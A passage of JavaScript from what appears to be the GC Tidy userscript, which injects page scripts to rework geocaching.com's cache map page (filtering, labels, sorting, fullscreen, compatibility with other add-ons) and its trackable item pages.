			this.set('filter', settingsArray.join(','));
		},
		updateFilterSummary: function(settings) {
			var typeCount = 0;
			var typeCountHidden = 0;
			$.each(settings, function(id, checked) {
				switch (id) {
					case 'chkHideFound':
					case 'chkHideOwned':
					case 'chkHideUnfound':
					case 'chkHideDisabled':
						$('#gctidy-filter-summary-' + id).toggle(checked);
						break;
					default:
						typeCount++;
						if (!checked) {
							typeCountHidden++;
						}
				}
				$('#gctidy-filter-summary-type').html(typeCountHidden ? typeCountHidden + '/' + typeCount : '&nbsp;');
			});
		},
		processSearchResults: function() {
			// Search tools
			var searchTools = $('#uxPremiumFeatures + p')
				.attr('id', 'gctidy-search-tools')
				.find('br:eq(0), br:eq(1)').remove().end()
				.find('strong:first, em:first').remove().end();
			
			// Refresh map
			$($('#uxMapRefresh').find('img')[0].nextSibling).remove();
			$('#uxMapRefresh')
				.prev('br').remove().end()
				.find('span')
					.text('Refresh Map')
					.before('&thinsp;');
			var labelRefreshLock = $('label[for="uxMapRefreshLock"]')
				.wrap('<span></span>')
				.before($('#uxMapRefresh'))
				.before('&nbsp;(')
				.before($('#uxMapRefreshLock'));
			labelRefreshLock.text('Automatically)');

			// Labels
			$('#chkShowNumbers')
				.attr('checked', this.get('label'))
				.click($.proxy(function() {
					this.set('label', $('#chkShowNumbers').attr('checked'));
				}, this));
			searchTools.find('label[for="chkShowNumbers"]')
				.text('Label: ')
				.after('<span id="gctidy-label-type-select"></span>');

			this.labelType = this.get('label_type');
			this.labelTypeSelectBox = {};
			$('#gctidy-label-type-select')
				.gctidySelectBox({
					controller: this.labelTypeSelectBox,
					options: [
						{name: 'number', title: 'Number'},
						{name: 'waypointTitle', title: 'Name'},
						{name: 'waypointId', title: 'GC Code'}
					],
					selected: this.labelType
				})
				.bind('change', $.proxy(function() {
					this.labelType = this.labelTypeSelectBox.selected();
					this.set('label_type', this.labelType);
					GCTidy.appendScript('text',
						'GCTidy.labelType = "' + this.labelType + '";' +
						'GCTidy.redrawLabels();' +
						'if (!jQuery("#chkShowNumbers").attr("checked")) {' +
						'	jQuery("#chkShowNumbers").attr("checked", true);' +
						'}' +
						'GCTidy.setMapLabelDisplay(true);'
					);
				}, this));
				
			// Search results
			var searchResults = $('<div id="gctidy-search-results"></div>')
				.insertBefore('#cacheListBounding')
				.append('<div id="gctidy-search-results-count"><img src="' + GCTidy.IMAGES.cacheMarker + '"><span id="spanCacheCount">0</span><br><small>Caches<small></div>');

			// Sort
			$('<div id="gctidy-search-results-sort"><span style="color: #999">Sort by: </span><span id="gctidy-sort-by-select-box"></span></div>')
				.prependTo(searchResults);

			this.sortBy = this.get('sort_by');
			this.sortBySelectBox = {};
			$('#gctidy-sort-by-select-box')
				.gctidySelectBox({
					controller: this.sortBySelectBox,
					align: 'right',
					options: [
						{name: 'distance', title: 'Distance'},
						{name: 'name', title: 'Name'},
						{name: 'gccode', title: 'GC Code'}
					],
					selected: this.sortBy
				})
				.bind('change', $.proxy(function() {
					var sortBy = this.sortBySelectBox.selected();
					if (sortBy != 'gcvote') {
						this.sortBy = sortBy;
						this.set('sort_by', sortBy);
					}
					GCTidy.appendScript('text',
						'GCTidy.sortBy = "' + sortBy + '";' +
						'if (GCTidy.sortBy != "gcvote") {' +
						'	GCTidy.updateSideBarList();' +
						'}'
					);
				}, this));
			
			$('#cacheListBody').appendTo('body').hide();
			$('<tbody id="gctidy-cache-list-body"></tbody>').appendTo('#cacheListTable');
		},
		processWidgets: function() {
			$('.gctidy-widget .gctidy-widget-header')
				.prepend('<img class="gctidy-opened" src="/images/arrow_open.gif">')
				.prepend('<img class="gctidy-closed" src="/images/arrow_close.gif">')
				.click($.proxy(function(event) {
					var header = $(event.target).closest('.gctidy-widget-header');
					var widget = header.parent();

					widget.toggleClass('gctidy-closed');
					this.adjustCacheListHeight();

					var closed = widget.hasClass('gctidy-closed');
					switch (widget.attr('id')) {
						case 'uxZoomToAddress':
							this.set('zoomtoaddress_closed', closed);
							if (!closed) {
								widget.find('input:first')[0].focus();
							}
							break;
						case 'uxPremiumFeatures':
							this.set('filter_closed', closed);
							break;
					}
				}, this));
			$('#uxZoomToAddress').toggleClass('gctidy-closed', this.get('zoomtoaddress_closed'));
			$('#uxPremiumFeatures').toggleClass('gctidy-closed', this.get('filter_closed'));
		},
		appendScript: function() {
			var script =
			'GCTidy = typeof GCTidy === "undefined" ? {} : GCTidy;' +
			'' +
			'GCTidy.labelType = "' + this.labelType + '";' +
			'GCTidy.sortBy = "' + this.sortBy + '";' +
			'' +
			'GCTidy.toggleCacheVisibility = function() {' +
			'	var typeHidden = {};' +
			'	jQuery("#gctidy-type-filter input").each(function() {' +
			'		var input = jQuery(this);' +
			'		typeHidden[input.val()] = !input.attr("checked");' +
			'	});' +
			'	var hideFound = $("chkHideFound").checked;' +
			'	var hideOwned = $("chkHideOwned").checked;' +
			'	var hideUnfound = $("chkHideUnfound").checked;' +
			'	var hideDisabled = $("chkHideDisabled").checked;' +
			'' +
			'	var labelType = GCTidy.labelType;' +
			'	var changeLabel;' +
			'	if (labelType != "number") {' +
			'		changeLabel = function(marker) {' +
			'			marker.div_.textContent = marker[labelType];' +
			'		};' +
			'	}' +
			'' +
			'	var marker;' +
			'	for (var i = 0, len = mrks.length; i < len; i++) {' +
			'		marker = mrks[i];' +
			'		if (typeHidden[marker.wptTypeId]) {' +
			'			!marker.isHidden() && marker.hide();' +
			'		}' +
			'		else if (!marker.isAvailable && hideDisabled || marker.found && hideFound || !marker.found && hideUnfound || marker.owned && hideOwned) {' +
			'			!marker.isHidden() && marker.hide();' +
			'		}' +
			'		else {' +
			'			marker.isHidden() && marker.show();' +
			'			changeLabel && changeLabel(marker);' +
			'		}' +
			'	}' +
			'};' +
			'' +
			'GCTidy.updateSideBarList = function() {' +
			'	if (isLoaded === false) {' +
			'		return;' +
			'	}' +
			'' +
			'	GCTidy.list = [];' +
			'	var bounds = map.getBounds();' +
			'	var marker;' +
			'	for (var i = 0, len = mrks.length; i < len; i++) {' +
			'		marker = mrks[i];' +
			'		if (!marker.isHidden() && bounds.containsLatLng(marker.getLatLng())) {' +
			'			GCTidy.list.push(marker);' +
			'		}' +
			'	}' +
			'' +
			'	if (GCTidy.sortBy == "distance" || GCTidy.sortBy == "name") {' +
			'		GCTidy.sortSideBarList(GCTidy.list);' +
			'	}' +
			'' +
			'	GCTidy.addCacheTableRows(GCTidy.list);' +
			'' +
			'	jQuery("#spanCacheCount").text(GCTidy.list.length);' +
			'	GCTidy.setMapLabelDisplay(jQuery("#chkShowNumbers").attr("checked"));' +
			'};' +
			'' +
			'GCTidy.sortSideBarList = function(list) {' +
			'	var compare, tbody, i, len;' +
			'	switch (GCTidy.sortBy) {' +
			'		case "distance":' +
			'			var center = map.getCenter();' +
			'			var marker;' +
			'			for (i = 0, len = list.length; i < len; i++) {' +
			'				marker = list[i];' +
			'				marker.distance = marker.getLatLng().distanceFrom(center);' +
			'			}' +
			'			compare = function(a, b) {' +
			'				return a.distance - b.distance;' +
			'			};' +
			'			break;' +
			'		case "name":' +
			'			compare = function(a, b) {' +
			'				var A = a.waypointTitle.toUpperCase();' +
			'				var B = b.waypointTitle.toUpperCase();' +
			'				if (A < B) return -1;' +
			'				if (A > B) return 1;' +
			'				return 0;' +
			'			};' +
			'			break;' +
			'		case "gcvote":' +
			'			tbody = document.getElementById("gctidy-cache-list-body");' +
			'			list = [];' +
			'			for (i = 0, len = tbody.childNodes.length; i < len; i++) {' +
			'				list.push(tbody.removeChild(tbody.childNodes[0]));' +
			'			}' +
			'			compare = function(a, b) {' +
			'				return b.getAttribute("gcvote_stars") - a.getAttribute("gcvote_stars");' +
			'			};' +
			'			break;' +
			'	}' +
			'' +
			'	list.sort(compare);' +
			'' +
			'	if (GCTidy.sortBy == "gcvote") {' +
			'		for (i = 0, len = list.length; i < len; i++) {' +
			'			tbody.appendChild(list[i]);' +
			'		}' +
			'	}' +
			'};' +
			'' +
			'GCTidy.addCacheTableRows = function(list) {' +
			'	var table = jQuery("#cacheListTable");' +
			'' +
			'	function bindEventHandler(row, id) {' +
			'		row.onclick = function() {cacheTableClick(id);};' +
			'		row.onmouseover = function() {cacheTableMouseOver(id);};' +
			'		row.onmouseout = function() {cacheTableMouseOut(id);};' +
			'	}' +
			'' +
			'	if (GCTidy.gcvote) {' +
			'		if (GCTidy.gcvoteCacheListBody) {' +
			'			GCTidy.gcvoteCacheListBody.empty();' +
			'		}' +
			'		else {' +
			'			GCTidy.gcvoteCacheListBody = jQuery("#cacheListBody");' +
			'		}' +
			'		GCTidy.gcvoteCacheListBody.append(\'<div><div id="gctidy-trick-rows"></div><div></div></div><div></div>\');' +
			'		var trickRows = GCTidy.gcvoteCacheListBody.find("#gctidy-trick-rows");' +
			'	}' +
			'' +
			'	var trickGCVoteGCTour;' +
			'	if (GCTidy.gcvote || GCTidy.gctour) {' +
			'		if (GCTidy.gcvote && !GCTidy.gctour) {' +
			'			trickGCVoteGCTour = function(id) {' +
			'				trickRows.append(\'<a href="wp=\' + id + \'"></a>\');' +
			'			};' +
			'		}' +
			'		else {' +
			'			trickGCVoteGCTour = function(id) {' +
			'				var row = jQuery(\'<div><span></span><span></span><span> </span><a href="wp=\' + id + \'">\' + id + \'</a></div>\').appendTo(trickRows);' +
			'				var td = jQuery(\'<td></td>\').appendTo(row);' +
			'				td.append(" ");' +
			'			};' +
			'		}' +
			'	}' +
			'' +
			'	var tbody = jQuery(\'<tbody id="gctidy-cache-list-body"></tbody>\');' +
			'	var marker, row;' +
			'	for (var i = 0, len = list.length; i < len; i++) {' +
			'		marker = list[i];' +
			'		row = jQuery(' +
			'			\'<tr id="ctRow\' + marker.mrkrIndex + \'" title="\' + marker.waypointTitle + \'">\' +' +
			'				\'<td celltype="cacheIndex">\' + (marker.mrkrIndex + 1) + \'</td>\' +' +
			'				\'<td><div style="display:none;"></div><img src="\' + marker.getIcon().printImage + \'"></td>\' +' +
			'				\'<td><div><a href="../seek/cache_details.aspx?wp=\' + marker.waypointId + \'" target="_blank">\' + marker.waypointTitle + \'</a></div></td>\' +' +
			'				\'<td celltype="cacheGCCode">\' + marker.waypointId + (GCTidy.gcvote ? \'<span id="td\' + marker.waypointId + \'"></span>\' : \'\') + \'</td>\' +' +
			'				\'<td> </td>\' +' +
			'			\'</tr>\'' +
			'		);' +
			'		if (!marker.isAvailable) {' +
			'			row.addClass("disabled");' +
			'		}' +
			'		bindEventHandler(row[0], marker.mrkrIndex);' +
			'		tbody.append(row);' +
			'' +
			'		trickGCVoteGCTour && trickGCVoteGCTour(marker.waypointId);' +
			'	}' +
			'	jQuery("#gctidy-cache-list-body").replaceWith(tbody);' +
			'' +
			'	if (GCTidy.gcvote && jQuery("#autoupdatemapinput").attr("checked")) {' +
			'		GCTidy.dispatchGCVoteEvent();' +
			'	}' +
			'	if (GCTidy.gctour) {' +
			'		trickRows = trickRows[0].childNodes;' +
			'		var rows = jQuery("#gctidy-cache-list-body tr");' +
			'		var image;' +
			'		for (var i = 0, len = trickRows.length; i < len; i++) {' +
			'			image = trickRows[i].childNodes[2].firstChild;' +
			'			rows[i].childNodes[2].firstChild.appendChild(image);' +
			'		}' +
			'	}' +
			'};' +
			'' +
			'GCTidy.dispatchGCVoteEvent = function() {' +
			'	var event = document.createEvent("MouseEvents");' +
			'	event.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);' +
			'	document.getElementById("hiddenTriggerInput").dispatchEvent(event);' +
			'	jQuery("#gctidy-search-tools").bind("DOMNodeRemoved", GCTidy.onGCVoteLoad);' +
			'};' +
			'' +
			'GCTidy.onGCVoteLoad = function(event) {' +
			'	if (event.target.id == "GCVoteWaitMap") {' +
			'		jQuery("#gctidy-search-tools").unbind("DOMNodeRemoved", GCTidy.onGCVoteLoad);' +
			'		if (GCTidy.sortBy == "gcvote") {' +
			'			GCTidy.sortSideBarList();' +
			'		}' +
			'	}' +
			'};' +
			'' +
			'GCTidy.redrawLabels = function() {' +
			'	var labelType = GCTidy.labelType;' +
			'' +
			'	var marker;' +
			'	for (var i = 0, len = mrks.length; i < len; i++) {' +
			'		marker = mrks[i];' +
			'		if (labelType == "number") {' +
			'			marker.div_.textContent = marker.mrkrIndex + 1;' +
			'		}' +
			'		else {' +
			'			marker.div_.textContent = marker[labelType];' +
			'		}' +
			'	}' +
			'};' +
			'' +
			'GCTidy.setMapLabelDisplay = function(visible) {' +
			'	var i, len, marker;' +
			'	for (i = 0, len = mrks.length; i < len; i++) {' +
			'		marker = mrks[i];' +
			'		if (visible) {' +
			'			!marker.isHidden() && marker.showLabel();' +
			'		}' +
			'		else {' +
			'			marker.hideLabel();' +
			'		}' +
			'	}' +
			'	jQuery("#cacheListTable").toggleClass("gctidy-number-label", GCTidy.labelType == "number" && visible);' +
			'};' +
			'' +
			'GCTidy.clearCacheTable = function() {' +
			'	jQuery("#cacheListTable tr").remove();' +
			'};' +
			'' +
			'updateSideBarList = GCTidy.updateSideBarList;' +
			'clearCacheTable = GCTidy.clearCacheTable;' +
			'setMapLabelDisplay = GCTidy.setMapLabelDisplay;' +
			'' +
			'ct_tgl = function() {' +
			'	GCTidy.toggleCacheVisibility();' +
			'	GCTidy.updateSideBarList();' +
			'};' +
			'' +
			'setHideState = function() {' +
			'	GCTidy.toggleCacheVisibility();' +
			'	GCTidy.updateSideBarList();' +
			'};' +
			'';
			
			script += this.get('alternative_cache_marker') ?
			'GCTidy.cacheIconImage = "' + GCTidy.IMAGES.cacheMarker + '";' +
			'GCTidy.cacheIconHoverImage = "' + GCTidy.IMAGES.cacheMarkerHover + '";' +
			'GCTidy.cacheIconDisabledImage = "' + GCTidy.IMAGES.cacheMarkerDisabled + '";' +
			'GCTidy.cacheIconShadowImage = "' + GCTidy.IMAGES.cacheMarkerShadow + '";' +
			'' +
			'GCTidy.createMarker = function(e) {' +
			'	var b = GCTidy.getIcon(e.wptTypeId, e.found, e.owned, e.isAvailable);' +
			'	var a = {' +
			'		icon: b,' +
			'		clickable: true,' +
			'		labelText: "<b>" + (e.mrkrIndex + 1) + "</b>",' +
			'		labelOffset: new GSize(6, -10),' +
			'		title: e.waypointTitle + " (" + e.waypointId + ")"' +
			'	};' +
			'	var d = new GLatLng(e.lat, e.lon);' +
			'	var c = new LabeledMarker(d, a);' +
			'	c.setLabelVisibility(false);' +
			'	c.mrkrIndex = e.mrkrIndex;' +
			'	c.cacheId = e.cacheId;' +
			'	c.wptTypeId = e.wptTypeId;' +
			'	c.found = e.found;' +
			'	c.owned = e.owned;' +
			'	c.waypointId = e.waypointId;' +
			'	c.waypointTitle = e.waypointTitle;' +
			'	c.isAvailable = e.isAvailable;' +
			'	c.triggerClick = function () {' +
			'		GEvent.trigger(c, "click")' +
			'	};' +
			'	GEvent.addListener(c, "click", function () {' +
			'		mrker = c;' +
			'		buildCDPage(e.cacheId)' +
			'	});' +
			'	GEvent.addListener(c, "mouseover", function () {' +
			'		c.setImage(GCTidy.cacheIconHoverImage);' +
			'		$("ctRow" + c.mrkrIndex).className = "yHover"' +
			'	});' +
			'	GEvent.addListener(c, "mouseout", function () {' +
			'		if (c.isAvailable == true) {' +
			'			$("ctRow" + c.mrkrIndex).className = "";' +
			'			c.setImage(GCTidy.cacheIconImage)' +
			'		} else {' +
			'			$("ctRow" + c.mrkrIndex).className = "disabled";' +
			'			c.setImage(GCTidy.cacheIconDisabledImage)' +
			'		}' +
			'	});' +
			'	return c;' +
			'};' +
			'' +
			'GCTidy.getIcon = function(type, found, owned, available) {' +
			'	var icon;' +
			'	var id = type + "_" + found + "_" + owned + "_" + available;' +
			'	var url;' +
			'	if (icons[id]) {' +
			'		icon = icons[id];' +
			'	}' +
			'	else {' +
			'		icon = new GIcon();' +
			'		if (available === true) {' +
			'			icon.image = GCTidy.cacheIconImage;' +
			'		}' +
			'		else {' +
			'			icon.image = GCTidy.cacheIconDisabledImage;' +
			'		}' +
			'		if (found === true) {' +
			'			url = "../images/gmn/f.png";' +
			'		}' +
			'		else if (owned === true) {' +
			'			url = "../images/gmn/o.png";' +
			'		}' +
			'		else {' +
			'			url = "../images/wpttypes/sm/" + type + ".gif";' +
			'		}' +
			'		icon.iconSize = new GSize(24, 27);' +
			'		icon.imageMap = [0, 0, 0, 27, 24, 27, 24, 0];' +
			'		icon.transparent = "../images/gmn/cm_t.png";' +
			'		icon.shadow = GCTidy.cacheIconShadowImage;' +
			'		icon.shadowSize = new GSize(39, 27);' +
			'		icon.iconAnchor = new GPoint(12, 27);' +
			'		icon.infoWindowAnchor = new GPoint(11, 2);' +
			'		icon.printImage = url;' +
			'		icon.mozPrintImage = url;' +
			'		icon.label = {' +
			'			url: url,' +
			'			anchor: new GPoint(4, 4),' +
			'			size: new GSize(16, 16)' +
			'		};' +
			'		icons[id] = icon;' +
			'	}' +
			'	return icon;' +
			'};' +
			'' +
			'GCTidy.cacheTableMouseOver = function(id) {' +
			'	var marker = mrks[id];' +
			'	marker.setImage(GCTidy.cacheIconHoverImage)' +
			'};' +
			'' +
			'GCTidy.cacheTableMouseOut = function(id) {' +
			'	var marker = mrks[id];' +
			'	if (marker.isAvailable === true) {' +
			'		marker.setImage(GCTidy.cacheIconImage)' +
			'	}' +
			'	else {' +
			'		marker.setImage(GCTidy.cacheIconDisabledImage)' +
			'	}' +
			'};' +
			'' +
			'createMarker = GCTidy.createMarker;' +
			'getIcon = GCTidy.getIcon;' +
			'cacheTableMouseOver = GCTidy.cacheTableMouseOver;' +
			'cacheTableMouseOut = GCTidy.cacheTableMouseOut;' +
			'' : '';
			
			script +=
			'if (pm && map) {' +
			'	jQuery("#chkHideDisabled, #chkHideUnfound")' +
			'		.click(ct_tgl);' +
			'}' +
			'setTimeout(function() {' +
			'	if (!pm) {' +
			'		jQuery("#chkHideDisabled, #chkHideUnfound")' +
			'			.removeAttr("disabled")' +
			'			.click(ct_tgl);' +
			'		jQuery("#gctidy-filter-select").hide();' +
			'	}' +
			'	if (queryParams) {' +
			'		if (queryParams.lat && queryParams.lng) {' +
			'			map.setCenter(new GLatLng(queryParams.lat, queryParams.lng));' +
			'		}' +
			'		if (queryParams.guid) {' +
			'			jQuery("#chkShowNumbers").prevAll().hide();' +
			'			jQuery("#uxPremiumFeatures").show();' +
			'			jQuery("#uxMapRefreshLock").attr("checked", false);' +
			'		}' +
			'	}' +
			'	if (!jQuery("#uxMapRefreshLock").attr("checked")) {' +
			'		mapSearch(true);' +
			'	}' +
			'}, 0);' +
			'';
			
			GCTidy.appendScript('text', script);
		},
		checkForScripts: function() {
			// GC Vote
			GCTidy.checkForScript({
				test: function() {
					return $('#gctidy-search-tools input[value*="GCVote"], #autoupdatemapinput');
				},
				eventType: 'DOMNodeInserted',
				eventTarget: $('#gctidy-search-tools'),
				success: $.proxy(this.onGCVote, this)
			});
			
			// GC Tour
			GCTidy.checkForScript({
				test: function() {
					return $('#Navigation > li');
				},
				eventType: 'DOMNodeInserted',
				eventTarget: $('#Navigation'),
				success: $.proxy(this.onGCTour, this)
			});
			
			// GC Google Map Enhancements
			GCTidy.checkForScript({
				test: function() {
					return $('#ToggleFilters');
				},
				eventType: 'DOMNodeInserted',
				eventTarget: $('#uxPremiumFeatures'),
				success: $.proxy(this.onGCGoogleMapEnhancements, this)
			});
		},
		onGCVote: function(gcVoteElement) {
			function process() {
				if (ENVIRONMENT == 'chrome' || ENVIRONMENT == 'safari') {
					gcVoteElement
						.attr('id', 'hiddenTriggerInput')
						.hide()
						.before('<input type="checkbox" id="autoupdatemapinput" class="Checkbox"><label for="autoupdatemapinput">GCVote</label>');
					$('#autoupdatemapinput')
						.attr('checked', this.get('gcvote'))
						.click($.proxy(function(event) {
							var checked = $(event.target).attr('checked');
							this.set('gcvote', checked);
							if (checked) {
								GCTidy.appendScript('text', 'GCTidy.dispatchGCVoteEvent();');
							}
						}, this));
				}
				else {
					gcVoteElement.next('span').wrap('<label for="autoupdatemapinput"></label>');
					gcVoteElement.next('label').text('GCVote').next('br').remove();
				}
				this.sortBySelectBox.addOption({name: 'gcvote', title: 'Votes'});
				this.sortByGCVote = this.get('sort_by_gcvote');

				var checkBox = $('#autoupdatemapinput')
					.click($.proxy(function() {
						if (this.sortByGCVote) {
							if (checkBox.attr('checked')) {
								this.sortBySelectBox.selected('gcvote');
							}
							else {
								this.sortBySelectBox.selected(this.sortBy);
							}
						}
					}, this));
				if (checkBox.attr('checked') && this.sortByGCVote) {
					this.sortBySelectBox.selected('gcvote');
				}

				$('#gctidy-sort-by-select-box')
					.bind('change', $.proxy(function() {
						var sortBy = this.sortBySelectBox.selected();
						if (sortBy == 'gcvote' && !checkBox.attr('checked')) {
							checkBox.attr('checked', true);
							this.set('gcvote', true);
						}
						if (checkBox.attr('checked')) {
							this.sortByGCVote = (sortBy == 'gcvote');
							this.set('sort_by_gcvote', this.sortByGCVote);
							if (this.sortByGCVote) {
								GCTidy.appendScript('text', 'GCTidy.dispatchGCVoteEvent();');							}
							}
					}, this));

				this.adjustCacheListHeight();
				
				GCTidy.appendScript('text',
					(checkBox.attr('checked') && this.sortByGCVote ? 'GCTidy.sortBy = "gcvote";' : '') +
					'GCTidy.gcvote = true;' +
					'updateSideBarList = GCTidy.updateSideBarList;'
				);
			}
			setTimeout($.proxy(process, this), 0);
		},
		onGCTour: function(gcTourElement) {
			function process() {
				gcTourElement
					.appendTo('#Navigation > ul')
					.css('background', '#F4F4F4');
				GCTidy.appendScript('text',
					'GCTidy.gctour = true;'
				);
			}
			setTimeout(process, 0);
		},
		onGCGoogleMapEnhancements: function() {
			function process() {
				GCTidy.Settings.set('page_CacheMapPage', false);
				GCTidy.PageExtensions.Configuration.build('CacheMapPage');
				GCTidy.appendStyle(
					'#gctidy-google-map-enhancements {background: #fcf6ce; padding: 1.7em 2em 1.7em 1.8em; margin: 0.5em -1em 0.5em -1.9em;}' +
					'#gctidy-google-map-enhancements p, #gctidy-google-map-enhancements p:first-child {margin: 0 0 1em; font-size: 100%; color: #444;}' +
					'#gctidy-google-map-enhancements ul {background: transparent; margin: 0 0 0 3em; padding: 0;}' +
					'#gctidy-google-map-enhancements li {margin: 0; list-style-type: disc; }'
				);
				$('<div id="gctidy-google-map-enhancements"></div>')
					.insertBefore('#page_CacheMapPage')
					.append('<p><strong>GC Google Map Enhancements detected</strong><br>GC Tidy disabled its processing of the map page. Continue using GC Google Map Enhancements by <a href="#">reloading the page</a>.</p>')
					.append('<p>To try out GC Tidy\'s map enhancements</p>')
					.append('<ul><li>disable GC Google Map Enhancements,</li><li>enable the option "Cache Map" below,</li><li>and <a href="#">reload the page</a>.</li></ol>')
					.find('a:eq(0)').click(function() {
						GCTidy.appendScript('text', 'window.location.href = window.location.href;'); 
						return false;
					}).end()
					.find('a:eq(1)').click(function() {
						GCTidy.Settings.set('page_CacheMapPage', true);
						GCTidy.appendScript('text', 'window.location.href = window.location.href;'); 
						return false;
					});
			}
			setTimeout(process, 0);
		},
		onToggleFullscreen: function() {
			$('body').toggleClass('gctidy-fullscreen-map');
			this.fullscreen = !this.fullscreen;
			this.set('fullscreen', this.fullscreen);
			this.adjustMapWidth();
			this.adjustMapHeight();
			this.adjustCacheListHeight();
			GCTidy.appendScript('text',
				'(function() {' +
				'	var loaded = isLoaded;' +
				'	var center = map.getCenter();' +
				'	isLoaded = false;' +
				'	map.checkResize();' +
				'	map.setCenter(center);' +
				'	isLoaded = loaded;' +
				'	if (!jQuery("#uxMapRefreshLock").attr("checked")) {' +
				'		setTimeout(updateSideBarList, 10);' +
				'	}' +
				'})();'
			);
			this.adjustMapTypeControlPosition();
		},
		onToggleSideBar: function() {
			$('body').toggleClass('gctidy-sidebar-hidden');
			$('#uxSideBar').toggle();
			this.sideBarHidden = !this.sideBarHidden;
			this.set('sidebar_hidden', this.sideBarHidden);
			this.adjustMapWidth();
			this.adjustCacheListHeight();
			GCTidy.appendScript('text', 'map.checkResize();');
			this.adjustMapTypeControlPosition();
		},
		onWindowResize: function(width, height) {
			this.windowHeight = height;
			this.adjustMapHeight();
			this.adjustCacheListHeight();
			if (this.sideBarHidden) {
				this.adjustMapWidth();
			}
			GCTidy.appendScript('text', 'map.checkResize();');
			this.adjustMapTypeControlPosition();
		},
		adjustMapWidth: function() {
			var map = $('#map');
			var mapOffset = map.offset();
			if (this.sideBarHidden) {
				map.width($('#bd').width() - mapOffset.left + (this.fullscreen ? 0 : 10));
			}
			else {
				map.width('100%');
			}
		},
		adjustMapHeight: function() {
			var map = $('#map');
			var mapOffset = map.offset();
			map.height(this.windowHeight - mapOffset.top - (this.fullscreen ? 0 : 17));
		},
		adjustCacheListHeight: function() {
			var cacheList = $('#cacheListBounding');
			var cacheListOffset = cacheList.offset();
			if (this.fullscreen) {
				cacheList.height(this.windowHeight - cacheListOffset.top - 1);
				cacheList.css('max-height', '100%');
			}
			else {
				cacheList.css('max-height', this.windowHeight - cacheListOffset.top - 19);
				cacheList.height('auto');
			}
		},
		adjustMapTypeControlPosition: function() {
			function adjust() {
				$('#map > div[style*="right: 7px; top: 7px;"]').attr('id', 'gctidy-map-type-control');
			}
			if (ENVIRONMENT == 'greasemonkey') {
				setTimeout(adjust, 0);
			}	
			else {
				adjust();
			}
		}
	},
	TrackableDetailsPage: {
		META: {
			title: 'Trackable Item Details'
		},
		OPTIONS: [
			{name: 'add_coord.info_widget', title: 'Add coord.info widget', type: 'bool', defaultValue: true}
		],
		STYLE:
			'#gctidy-tbcode-widget {float: right; font-size: 153.9%; margin: -1em 0;}' +
			'#gctidy-tbcode-widget small {font-size: 45%; color: #999; margin-left: 0.5em;}' +
			'#gctidy-tbcode-widget:hover small {color: #424242;}' +
			'#ctl00_ContentBody_OptionTable {margin-left: 1em; margin-top: -2.25em;}' +
			'#ctl00_ContentBody_BugTypeImage {top: 0;}' +
			'#ctl00_ContentBody_BugDetails_BugImage {margin-top: 2.5em;}' +
			'dl.BugDetailsList dt, dl.BugDetailsList dd {padding-bottom: 0;}' +
			'',
		process: function() {
			// Image
			var image = $('#ctl00_ContentBody_BugDetails_BugImage').unwrap();
			image.insertBefore(image.prev());
			
			// Gallery images
			$('#ctl00_ContentBody_Images h3').hide().before('<h3>Gallery Images</h3>');
			$('#ctl00_ContentBody_Images').prev('div[class="Clear"]').hide();
			
			// TB Code
			var tbCode = $('#ctl00_ContentBody_BugDetails_BugTBNum strong');
			tbCode.parent().parent().hide();
			tbCode
				.attr('id', 'gctidy-tbcode')
				.insertAfter('.BreadcrumbsWidget')
				.wrap('<div id="gctidy-tbcode-widget"></div>');
			if (this.get('add_coord.info_widget')) {
				this.addCoordInfoWidget();
			}
			
			// How do trackables work
			$('#ctl00_ContentBody_BugDetails_uxFirstTime').parent('strong').parent('p').remove();
			
			// Log table
			$('.TrackableItemLogTable').prev('ul').prev('h3').css('clear', 'right');
			
			// Log images
			$('.log_images a').each(function() {
				var anchor = $(this);
				anchor.attr('href', anchor.attr('href').replace('/log/display/', '/log/'));
			});
			GCTidy.appendScript('text',
				'jQuery.fn.fancybox.defaults.titlePosition = "inside";' + 
				'jQuery.fn.fancybox.defaults.overlayOpacity = 0.8;'
			);
		},
		addCoordInfoWidget: function() {
			var tbcodeWidget = $('#gctidy-tbcode-widget');
			tbcodeWidget
				.css('cursor', 'pointer')
				.append('<small>▼</small>')
				.click(function() {
					// Greasemonkey jQuery fix
					GCTidy.appendScript('text',
						'jQuery("#dlgClipboard")' +
						'	.show()' +
						'	.find("input")' +
						'		.val("http://coord.info/" + $("#gctidy-tbcode").text())' +
						'		.focus()' +
						'		.select();' +
						''
					);
				});
			var clipboard = $('<div id="dlgClipboard"><input type="text" class="TextFormat"><img src="/images/stockholm/mini/close.gif"></div>');
			clipboard
				.appendTo('#Content')
				.css({'right': '3.7em', 'top': tbcodeWidget.offset().top + tbcodeWidget.height() + 3 + 'px'})
				.find('img')
					.css({'float': 'right', 'cursor': 'pointer'})
					.click(function() {
						clipboard.hide();
					});
			$(document).mouseup(function(e) {
				if ($(e.target).parent("div#dlgClipboard").length === 0) {
					 clipboard.hide();
				}
			});
		},
		getTrackableImages: function() {
			var images = [];
			$('#ctl00_ContentBody_Images a.tb_images').each(function() {
				var anchor = $(this);
				var image = {
					anchor: anchor,
					guid: anchor.attr('href').match(/img\.geocaching\.com\/track\/([^\.]*\.(?:jpg|gif|png))/i)[1],
					title: anchor.find('span').text(),
					rel: anchor.attr('rel')
				};
				images.push(image);
			});
			return images;
		},
		getTrackableLogImages: function() {
		}
	},
	TrackableMapPage: {
		META: {
			title: 'Trackable Item Map'
		},
		SETTINGS: [
			{name: 'trackable_map_height', type: 'number', defaultValue: 300}
		],
		process: function() {
			GCTidy.appendScript('text',
				'GCTidyInitialize = initialize;' +
				'initialize = function() {' +
				'	GCTidyInitialize();' +
				'	map && map.enableScrollWheelZoom();' +
				'};'
			);
			var map = $('#ctl00_ContentBody_map_canvas');
			map.css('height', this.get('trackable_map_height') + 'px');
			map.gctidyVerticalResizer({
				minHeight: 200,
				onResizeEnd: $.proxy(function() {
					this.set('trackable_map_height', map.height());
					GCTidy.appendScript('text', 'map.checkResize();');
				}, this)
			});
		},
		getLogImages: function() {
			var logs = [];
			$("#Content .yui-g:eq(1) table td[colspan='4']").each(function() {
				var photos = $(this).find("strong:contains('Photos:')");
				if (!photos.length) {
					return;
				}
				var node = photos[0].nextSibling;
				var nextNode;
				while (node) {
					nextNode = node.nextSibling;
					if (node.nodeType == 3) {
						$(node).wrap('<span></span>');
					}
					node = nextNode;
				}
				photos.nextAll().andSelf().wrapAll('<span class="gctidy-photos"></span>');
				photos = photos.parent('span.gctidy-photos');
				var log = {
					photos: photos,
					images: []
				};
				photos.find('a').each(function() {
					var anchor = $(this);
					var image = {
						anchor: anchor,
